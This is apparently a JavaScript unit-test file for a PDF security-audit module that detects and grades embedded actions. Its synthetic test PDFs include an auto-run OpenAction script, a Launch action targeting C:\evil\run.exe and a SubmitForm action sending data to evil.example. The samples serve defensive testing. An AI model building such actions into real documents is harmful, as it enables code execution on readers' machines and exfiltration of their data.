/*
 * AP：PDF 动作/JavaScript 安全审计（OS.PdfActions）单测
 * 合成 PDF 字节级验证：OpenAction / AA 附加动作 / 动作对象扫描 /
 * /JS 解码（字面串·hex UTF-16BE·八进制转义）/ Launch·SubmitForm 目标 /
 * Names-JavaScript / 干净文档 / 导出报告。
 */
(async function () {
  const T = require("./app/js/modules/pdf-actions.js");
  let passed = 0, failed = 0;
  function ok(name, cond) {
    if (cond) { passed++; console.log("✓ " + name); }
    else { failed++; console.error("✗ " + name); }
  }
  function toBytes(s) {
    const a = new Uint8Array(s.length);
    for (let i = 0; i < s.length; i++) a[i] = s.charCodeAt(i) & 0xff;
    return a;
  }

  // ———————— A：富动作文档（OpenAction→JS、AA→Launch、SubmitForm、内联 URI、Names-JavaScript）————————
  const pdfA = toBytes(
    "%PDF-1.7\n" +
    "1 0 obj\n<< /Type /Catalog /Pages 2 0 R /OpenAction 5 0 R /Names << /JavaScript << /Names [(boot) 9 0 R] >> >> >>\nendobj\n" +
    "2 0 obj\n<< /Type /Pages /Kids [3 0 R 10 0 R] /Count 2 >>\nendobj\n" +
    "3 0 obj\n<< /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792] /AA 6 0 R >>\nendobj\n" +
    "5 0 obj\n<< /Type /Action /S /JavaScript /JS (app.alert\\(\"hi\"\\);) >>\nendobj\n" +
    "6 0 obj\n<< /O 7 0 R >>\nendobj\n" +
    "7 0 obj\n<< /Type /Action /S /Launch /Win << /F (C:\\\\evil\\\\run.exe) >> >>\nendobj\n" +
    "8 0 obj\n<< /Type /Action /S /SubmitForm /URL (https://evil.example/x) >>\nendobj\n" +
    "9 0 obj\n<< /Type /Action /S /JavaScript /JS (payload\\050x\\051) >>\nendobj\n" +
    "10 0 obj\n<< /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792] /A << /S /URI /URI (https://ok.example) >> >>\nendobj\n" +
    "trailer\n<< /Size 11 /Root 1 0 R >>\n" +
    "%%EOF\n"
  );
  const A = T.parseActions(pdfA);
  ok("A1 hasCatalog=true", A.hasCatalog === true);
  ok("A2 hasOpenAction=true", A.hasOpenAction === true);
  ok("A3 动作总数=5（JS/JS-Names/Launch/Submit/URI）", A.actions.length === 5);
  ok("A4 verdict=high（含高险）", A.summary.verdict === "high");
  ok("A5 highCount=3（JS×2+Launch）", A.summary.highCount === 3);
  ok("A6 mediumCount=1（SubmitForm）", A.summary.mediumCount === 1);
  const jsOpen = A.actions.find(a => a.obj === 5);
  ok("A7 对象5 识别 JavaScript", !!jsOpen && jsOpen.kind === "JavaScript");
  ok("A8 对象5 via OpenAction", !!jsOpen && jsOpen.vias.some(v => v.indexOf("OpenAction") >= 0));
  ok("A9 对象5 自动执行", !!jsOpen && jsOpen.autoRun === true);
  ok("A10 对象5 JS 片段含 app.alert", !!jsOpen && jsOpen.snippet && jsOpen.snippet.indexOf("app.alert") >= 0 && jsOpen.snippet.indexOf('"hi"') >= 0);
  const launch = A.actions.find(a => a.obj === 7);
  ok("A11 对象7 识别 Launch 且 via AA(/O)", !!launch && launch.kind === "Launch" && launch.vias.some(v => v.indexOf("AA 附加动作（/O）") >= 0));
  ok("A12 对象7 Launch 目标=run.exe", !!launch && launch.detail && launch.detail.indexOf("run.exe") >= 0);
  ok("A13 对象7 归属第 1 页（AA 在页3）", !!launch && launch.pages.length === 1 && launch.pages[0] === 1);
  const submit = A.actions.find(a => a.obj === 8);
  ok("A14 对象8 SubmitForm 中险 + URL", !!submit && submit.risk === "medium" && submit.detail && submit.detail.indexOf("https://evil.example/x") >= 0);
  ok("A15 对象9 Names-JavaScript via 名称树", A.actions.some(a => a.obj === 9 && a.vias.some(v => v.indexOf("Names/JavaScript") >= 0)));
  ok("A16 对象9 八进制转义 \\050\\051 解码为括号", A.actions.some(a => a.obj === 9 && a.snippet && a.snippet.indexOf("payload(x)") >= 0));
  const inlineUri = A.actions.find(a => a.kind === "URI");
  ok("A17 内联 /A URI 低险 + 链接目标", !!inlineUri && inlineUri.risk === "low" && inlineUri.detail && inlineUri.detail.indexOf("https://ok.example") >= 0);
  ok("A18 摘要 jsCount=2 launchCount=1", A.summary.jsCount === 2 && A.summary.launchCount === 1);
  ok("A19 排序：首条为高风险", A.actions.length > 0 && A.actions[0].risk === "high");
  ok("A20 autoRunCount≥1", A.summary.autoRunCount >= 1);

  // ———————— B：干净文档 ————————
  const pdfB = toBytes(
    "%PDF-1.4\n" +
    "1 0 obj\n<< /Type /Catalog /Pages 2 0 R >>\nendobj\n" +
    "2 0 obj\n<< /Type /Pages /Kids [3 0 R] /Count 1 >>\nendobj\n" +
    "3 0 obj\n<< /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792] >>\nendobj\n" +
    "trailer\n<< /Size 4 /Root 1 0 R >>\n" +
    "%%EOF\n"
  );
  const B = T.parseActions(pdfB);
  ok("B1 干净文档动作数=0", B.hasActions === false && B.actions.length === 0);
  ok("B2 verdict=clean", B.summary.verdict === "clean");
  ok("B3 hasOpenAction=false", B.hasOpenAction === false);

  // ———————— C：OpenAction 目标数组 + hex UTF-16BE JS + /JS 无 /S 兜底 ————————
  const pdfC = toBytes(
    "%PDF-1.7\n" +
    "1 0 obj\n<< /Type /Catalog /Pages 2 0 R /OpenAction [3 0 R /Fit] >>\nendobj\n" +
    "2 0 obj\n<< /Type /Pages /Kids [3 0 R] /Count 1 >>\nendobj\n" +
    "3 0 obj\n<< /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792] >>\nendobj\n" +
    "4 0 obj\n<< /Type /Action /S /JavaScript /JS <FEFF00480069> >>\nendobj\n" +
    "5 0 obj\n<< /JS (bare\\101script) >>\nendobj\n" +
    "trailer\n<< /Size 6 /Root 1 0 R >>\n" +
    "%%EOF\n"
  );
  const C = T.parseActions(pdfC);
  ok("C1 OpenAction 目标数组（非脚本）", C.openActionIsDest === true);
  ok("C2 目标数组记录为 GoTo(info) 不计高险", C.summary.highCount === 2 && C.actions.every(a => a.obj !== 1 || (a.risk === "info" && a.kind === "GoTo")));
  ok("C3 hex UTF-16BE JS 解码为 Hi", C.actions.some(a => a.obj === 4 && a.snippet === "Hi"));
  ok("C4 /JS 无 /S 兜底识别", C.actions.some(a => a.obj === 5 && a.kind === "JavaScript"));
  ok("C5 八进制 \\101 解码为 A", C.actions.some(a => a.obj === 5 && a.snippet && a.snippet.indexOf("bareAscript") >= 0));
  ok("C6 verdict=high（仍有真 JS）", C.summary.verdict === "high");

  // ———————— D：导出报告 ————————
  const md = T.toMarkdown(A, { title: "测试文档 安全审计" });
  ok("D1 MD 含标题", md.indexOf("# 测试文档 安全审计") === 0);
  ok("D2 MD 含高风险提示与 run.exe", md.indexOf("高风险动作 3 个") >= 0 && md.indexOf("run.exe") >= 0);
  ok("D3 MD 含 JS 片段", md.indexOf("app.alert") >= 0);
  const mdB = T.toMarkdown(B, { title: "干净文档" });
  ok("D4 干净文档 MD 给出结论", mdB.indexOf("未发现任何动作") >= 0);
  const html = T.toHtml(A);
  ok("D5 HTML 含风险条目与跳页", html.indexOf("高风险]") >= 0 && html.indexOf('data-page="1"') >= 0);
  ok("D6 HTML 干净文档绿条", T.toHtml(B).indexOf("未发现任何动作") >= 0);

  // ———————— E：summarize 一致性 ————————
  const S = T.summarize(A);
  ok("E1 summarize.total=5", S.total === 5);
  ok("E2 summarize.verdict=high", S.verdict === "high");

  console.log("\n结果：" + passed + " 通过，" + failed + " 失败");
  if (failed) process.exit(1);
})().catch(e => { console.error("✗ 运行异常：" + (e && e.stack || e)); process.exit(1); });
